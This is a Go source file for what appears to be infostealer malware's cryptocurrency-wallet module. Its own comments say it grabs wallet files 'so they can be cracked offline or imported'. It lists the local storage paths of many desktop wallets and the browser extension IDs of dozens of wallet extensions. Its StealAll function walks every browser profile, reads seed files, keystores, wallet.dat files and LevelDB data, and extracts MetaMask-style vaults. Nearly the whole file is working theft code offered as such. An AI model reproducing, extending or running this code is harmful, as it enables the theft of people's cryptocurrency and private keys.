package wallets

/*
	Crypto wallet extraction module

	Supports:
	- Desktop wallets (Exodus, Electrum, Atomic, etc)
	- Browser extension wallets (Metamask, Phantom, etc)

	Most wallets store encrypted data locally
	We grab the files so they can be cracked offline or imported

	Important files:
	- seed.seco (exodus seed phrase, encrypted)
	- wallet.dat (bitcoin core, can be cracked with hashcat)
	- keystore files (ethereum, JSON format)
	- leveldb folders (browser extensions)

	TODO: add atomic wallet specific extraction
	TODO: add seed phrase memory scanning
*/

import (
	"encoding/hex"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
)

type WalletData struct {
	Wallets    []Wallet
	Extensions []ExtensionWallet
}

type Wallet struct {
	Name  string
	Path  string
	Type  string // "desktop" or "extension"
	Files []WalletFile
}

type WalletFile struct {
	Name    string
	Content []byte
}

type ExtensionWallet struct {
	Name    string
	Browser string
	ExtID   string
	Data    []byte
}

// Desktop wallet paths
// Most are in AppData, a few in Documents
var desktopWallets = map[string]string{
	// Popular multi-chain wallets
	"Exodus":       filepath.Join(os.Getenv("APPDATA"), "Exodus", "exodus.wallet"),
	"AtomicWallet": filepath.Join(os.Getenv("APPDATA"), "atomic", "Local Storage", "leveldb"),
	"Jaxx":         filepath.Join(os.Getenv("APPDATA"), "com.liberty.jaxx", "IndexedDB"),
	"Coinomi":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Coinomi", "Coinomi", "wallets"),
	"Guarda":       filepath.Join(os.Getenv("APPDATA"), "Guarda", "Local Storage", "leveldb"),

	// Bitcoin-family core wallets
	"Bitcoin":  filepath.Join(os.Getenv("APPDATA"), "Bitcoin", "wallets"),
	"Litecoin": filepath.Join(os.Getenv("APPDATA"), "Litecoin", "wallets"),
	"Dash":     filepath.Join(os.Getenv("APPDATA"), "DashCore", "wallets"),

	// Electrum and variants - JSON wallets
	"Electrum":     filepath.Join(os.Getenv("APPDATA"), "Electrum", "wallets"),
	"Electrum-LTC": filepath.Join(os.Getenv("APPDATA"), "Electrum-LTC", "wallets"),

	// Ethereum
	"Ethereum": filepath.Join(os.Getenv("APPDATA"), "Ethereum", "keystore"), // geth keystore

	// Privacy coins
	"Monero":       filepath.Join(os.Getenv("USERPROFILE"), "Documents", "Monero", "wallets"), // weird path
	"Zcash":        filepath.Join(os.Getenv("APPDATA"), "Zcash"),
	"WasabiWallet": filepath.Join(os.Getenv("APPDATA"), "WalletWasabi", "Client", "Wallets"), // privacy focused btc

	// Less common but still worth grabbing
	"Armory":   filepath.Join(os.Getenv("APPDATA"), "Armory"),
	"Bytecoin": filepath.Join(os.Getenv("APPDATA"), "bytecoin"),
	"Binance":  filepath.Join(os.Getenv("APPDATA"), "Binance"),
}

// Browser extension wallet IDs
// These are Chrome/Edge extension IDs - same across chromium browsers
// Found by going to chrome://extensions and looking at the ID
var extensionWallets = map[string][]string{
	// The big ones
	"Metamask":     {"nkbihfbeogaeaoehlefnkodbefgpgknn", "ejbalbakoplchlghecdalmeeeajnimhm"}, // 2nd is edge version
	"TronLink":     {"ibnejdfjmmkpcnlpebklmnkoeoihofec"},
	"BinanceChain": {"fhbohimaelbohpjbbldcngcnapndodjp"},
	"Coin98":       {"aeachknmefphepccionboohckonoeemg"},
	"Phantom":      {"bfnaelmomeimhlpmgjnjophhpkkoljpa"}, // solana

	// More wallets - sorted roughly by popularity
	"TrustWallet":    {"egjidjbpglichdcondbcbdnbeeppgdph"},
	"CoinbaseWallet": {"hnfanknocfeofbddgcijnmhnfnkdnaad"},
	"Ronin":          {"fnjhmkhhmkbjkkabndcnnogagogbneec"}, // axie infinity
	"Exodus":         {"aholpfdialjgjfhomihkjbmgjidlcdno"},
	"Brave":          {"odbfpeeihdkbihmopkbjmoonfanlbfcl"},
	"Crypto.com":     {"hifafgmccdpekplomjjkcfgodnhcellj"},
	"Keplr":          {"dmkamcknogkgcdfhhbddcghachkejeap"}, // cosmos
	"Solflare":       {"bhhhlbepdkbapadjdnnojkbgioiodbic"},
	"Slope":          {"pocmplpaccanhmnllbbkpgfliimjljgo"},
	"Starcoin":       {"mfhbebgoclkghebffdldpobeajmbecfk"},
	"Swash":          {"cmndjbecilbocjfkibfbifhngkdmjgog"},
	"Finnie":         {"cjmkndjhnagcfbpiemnkdpomccnjblmj"},
	"Karda":          {"ifckdpamphokdglkkdomedpdegcjhjdp"},
	"Rabby":          {"acmacodkjbdgmoleebolmdjonilkdbch"},
	"Braavos":        {"jnlgamecbpmbajjfhmmmlhejkemejdma"}, // starknet
	"OKX":            {"mcohilncbfahbmgdjkbpemcciiolgcge"},
	"Sender":         {"epapihdplajcdnnkdeiahlgigofloibg"},
	"Hashpack":       {"gjagmgiddbbciopjhllkdnddhcglnemk"}, // hedera
	"Martian":        {"efbglgofoippbgcjepnhiblaibcnclgk"},
	"Petra":          {"ejjladinnckdgjemekebdpeokbikhfci"},
	"Pontem":         {"phkbamefinggmakgklpkljjmgibohnba"},
	"Fewcha":         {"ebfidpplhabeedpnhjnobghokpiioolj"},
	"Glow":           {"ojbcfhjmpigfobfclfflafhblgemelio"},
	"Aurory":         {"kilnpioakcdndlodeeceffgjdpojajlo"},
	"Trezor":         {"imloifkgjagghnncjkhggdhalmcnfklk"},
	"Ton":            {"nphplpgoakhhjchkkhmiggakijnkhfnd"},
	"SubWallet":      {"onhogfjeacnfoofkfgppdlbmlmnplgbn"}, // polkadot
	"Nami":           {"lpfcbjknijpeeillifnkikgncikgfhdo"}, // cardano
	"Eternl":         {"kmhcihpebfmpgmihbkipmjlmmioameka"}, // cardano
	"CardWallet":     {"apnehcjmnengpnmccpaibjmhhoadaico"},
	"XDeFi":          {"hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
	"Safepal":        {"lgmpcpglpngdoalbgeoldeajfclnhafa"},
	"BitKeep":        {"jiidiaalihmmhddjgbnbgdfflelocpak"},
}

// Browser extension paths
// Extensions store data in Local Extension Settings folder
var browserExtPaths = map[string]string{
	"Chrome":   filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
	"Edge":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
	"Brave":    filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
	"Opera":    filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
	"OperaGX":  filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
	"Vivaldi":  filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
	"Chromium": filepath.Join(os.Getenv("LOCALAPPDATA"), "Chromium", "User Data"),
}

// StealAll - main entry point, extracts all wallet data
func StealAll() *WalletData {
	data := &WalletData{}

	// Desktop wallets first
	for name, path := range desktopWallets {
		wallet := stealDesktopWallet(name, path)
		if wallet != nil {
			data.Wallets = append(data.Wallets, *wallet)
		}
	}

	// Browser extension wallets
	// gotta check all profiles since users might have multiple
	for browser, basePath := range browserExtPaths {
		if _, err := os.Stat(basePath); os.IsNotExist(err) {
			continue
		}

		profiles := findBrowserProfiles(basePath)
		for _, profile := range profiles {
			extPath := filepath.Join(profile, "Local Extension Settings")
			if _, err := os.Stat(extPath); os.IsNotExist(err) {
				continue
			}

			// check each wallet extension
			for walletName, extIDs := range extensionWallets {
				for _, extID := range extIDs {
					ext := stealExtensionWallet(walletName, browser, extID, extPath)
					if ext != nil {
						data.Extensions = append(data.Extensions, *ext)
					}
				}
			}
		}
	}

	return data
}

func stealDesktopWallet(name, path string) *Wallet {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil
	}

	wallet := &Wallet{
		Name: name,
		Path: path,
		Type: "desktop",
	}

	// Different wallets store data differently
	// grab the right files based on wallet type
	switch name {
	case "Exodus":
		// exodus stores seed phrase in seed.seco (encrypted)
		wallet.Files = grabExodusFiles(path)
	case "Electrum", "Electrum-LTC":
		// electrum uses JSON wallet files
		wallet.Files = grabElectrumFiles(path)
	case "Ethereum":
		// geth keystore files - JSON encrypted with password
		wallet.Files = grabKeystoreFiles(path)
	case "AtomicWallet":
		// leveldb storage like browser extensions
		wallet.Files = grabLevelDBFiles(path)
	case "Bitcoin", "Litecoin", "Dash":
		// classic wallet.dat files - can crack with hashcat
		wallet.Files = grabWalletDatFiles(path)
	case "Monero":
		// monero has its own format
		wallet.Files = grabMoneroFiles(path)
	case "WasabiWallet":
		// wasabi uses custom JSON format
		wallet.Files = grabWasabiFiles(path)
	default:
		// for unknown wallets, just grab everything
		wallet.Files = grabAllFiles(path)
	}

	if len(wallet.Files) == 0 {
		return nil
	}

	return wallet
}

// grabExodusFiles - gets Exodus wallet files
// The important ones are seed.seco (encrypted seed phrase) and passphrase.json
func grabExodusFiles(basePath string) []WalletFile {
	var files []WalletFile
	targets := []string{
		"passphrase.json", "seed.seco", "info.seco",
		// also check inside exodus.wallet subfolder
		filepath.Join("exodus.wallet", "passphrase.json"),
		filepath.Join("exodus.wallet", "seed.seco"),
		filepath.Join("exodus.wallet", "info.seco"),
	}

	for _, target := range targets {
		fullPath := filepath.Join(basePath, target)
		if content, err := os.ReadFile(fullPath); err == nil {
			files = append(files, WalletFile{
				Name:    target,
				Content: content,
			})
		}
	}

	return files
}

// grabElectrumFiles - grabs Electrum wallet files
// These are JSON files containing encrypted wallet data
func grabElectrumFiles(basePath string) []WalletFile {
	var files []WalletFile

	entries, err := os.ReadDir(basePath)
	if err != nil {
		return files
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		content, err := os.ReadFile(filepath.Join(basePath, entry.Name()))
		if err != nil {
			continue
		}

		// electrum wallets are valid JSON
		// skip random files that aren't wallets
		if json.Valid(content) {
			files = append(files, WalletFile{
				Name:    entry.Name(),
				Content: content,
			})
		}
	}

	return files
}

func grabKeystoreFiles(basePath string) []WalletFile {
	var files []WalletFile

	entries, err := os.ReadDir(basePath)
	if err != nil {
		return files
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		// ethereum keystore files start with UTC--
		if strings.HasPrefix(entry.Name(), "UTC--") {
			content, err := os.ReadFile(filepath.Join(basePath, entry.Name()))
			if err != nil {
				continue
			}

			files = append(files, WalletFile{
				Name:    entry.Name(),
				Content: content,
			})
		}
	}

	return files
}

func grabLevelDBFiles(basePath string) []WalletFile {
	var files []WalletFile

	filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		if info.IsDir() {
			return nil
		}

		ext := strings.ToLower(filepath.Ext(info.Name()))
		if ext == ".ldb" || ext == ".log" || info.Name() == "CURRENT" || info.Name() == "MANIFEST" {
			content, err := os.ReadFile(path)
			if err != nil {
				return nil
			}

			relPath, _ := filepath.Rel(basePath, path)
			files = append(files, WalletFile{
				Name:    relPath,
				Content: content,
			})
		}

		return nil
	})

	return files
}

func grabWalletDatFiles(basePath string) []WalletFile {
	var files []WalletFile

	filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		if info.Name() == "wallet.dat" {
			content, err := os.ReadFile(path)
			if err != nil {
				return nil
			}

			relPath, _ := filepath.Rel(basePath, path)
			files = append(files, WalletFile{
				Name:    relPath,
				Content: content,
			})
		}

		return nil
	})

	return files
}

func grabMoneroFiles(basePath string) []WalletFile {
	var files []WalletFile

	filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		ext := strings.ToLower(filepath.Ext(info.Name()))
		if ext == ".keys" || ext == "" && strings.Contains(info.Name(), "wallet") {
			content, err := os.ReadFile(path)
			if err != nil {
				return nil
			}

			relPath, _ := filepath.Rel(basePath, path)
			files = append(files, WalletFile{
				Name:    relPath,
				Content: content,
			})
		}

		return nil
	})

	return files
}

func grabWasabiFiles(basePath string) []WalletFile {
	var files []WalletFile

	entries, err := os.ReadDir(basePath)
	if err != nil {
		return files
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		if strings.HasSuffix(entry.Name(), ".json") {
			content, err := os.ReadFile(filepath.Join(basePath, entry.Name()))
			if err != nil {
				continue
			}

			files = append(files, WalletFile{
				Name:    entry.Name(),
				Content: content,
			})
		}
	}

	return files
}

func grabAllFiles(basePath string) []WalletFile {
	var files []WalletFile
	maxSize := int64(10 * 1024 * 1024) // 10MB max

	filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		if info.IsDir() {
			return nil
		}

		if info.Size() > maxSize {
			return nil
		}

		content, err := os.ReadFile(path)
		if err != nil {
			return nil
		}

		relPath, _ := filepath.Rel(basePath, path)
		files = append(files, WalletFile{
			Name:    relPath,
			Content: content,
		})

		return nil
	})

	return files
}

func stealExtensionWallet(name, browser, extID, extPath string) *ExtensionWallet {
	walletPath := filepath.Join(extPath, extID)
	if _, err := os.Stat(walletPath); os.IsNotExist(err) {
		return nil
	}

	var data []byte

	// grab all LevelDB files
	filepath.Walk(walletPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		if info.IsDir() {
			return nil
		}

		content, err := os.ReadFile(path)
		if err != nil {
			return nil
		}

		data = append(data, content...)
		data = append(data, '\n')

		return nil
	})

	if len(data) == 0 {
		return nil
	}

	// extract vault data from metamask-style extensions
	vaultData := extractVaultData(data)
	if vaultData != nil {
		data = vaultData
	}

	return &ExtensionWallet{
		Name:    name,
		Browser: browser,
		ExtID:   extID,
		Data:    data,
	}
}

func extractVaultData(data []byte) []byte {
	// metamask stores encrypted vault in specific format
	dataStr := string(data)

	// look for vault patterns
	patterns := []string{
		`"vault":"`,
		`"data":"`,
		`"KeyringController":`,
	}

	for _, pattern := range patterns {
		idx := strings.Index(dataStr, pattern)
		if idx != -1 {
			// extract JSON-like structure
			start := idx
			end := strings.Index(dataStr[start:], `"}`)
			if end != -1 {
				return []byte(dataStr[start : start+end+2])
			}
		}
	}

	return nil
}

func findBrowserProfiles(basePath string) []string {
	var profiles []string

	defaultProfile := filepath.Join(basePath, "Default")
	if _, err := os.Stat(defaultProfile); err == nil {
		profiles = append(profiles, defaultProfile)
	}

	entries, err := os.ReadDir(basePath)
	if err != nil {
		return profiles
	}

	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			profiles = append(profiles, filepath.Join(basePath, entry.Name()))
		}
	}

	return profiles
}

// helper to detect crypto addresses in memory
func FindCryptoAddresses(data []byte) map[string][]string {
	addresses := make(map[string][]string)
	dataStr := string(data)

	// BTC patterns
	btcPattern := `[13][a-km-zA-HJ-NP-Z1-9]{25,34}`
	bech32Pattern := `bc1[a-z0-9]{39,59}`

	// ETH pattern
	ethPattern := `0x[a-fA-F0-9]{40}`

	// simple regex match (actual implementation would use regexp)
	_ = btcPattern
	_ = bech32Pattern
	_ = ethPattern
	_ = dataStr

	return addresses
}

// convert wallet seed to hex
func SeedToHex(seed []byte) string {
	return hex.EncodeToString(seed)
}

// copy file helper
func copyFile(src, dst string) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()

	_, err = io.Copy(destination, source)
	return err
}
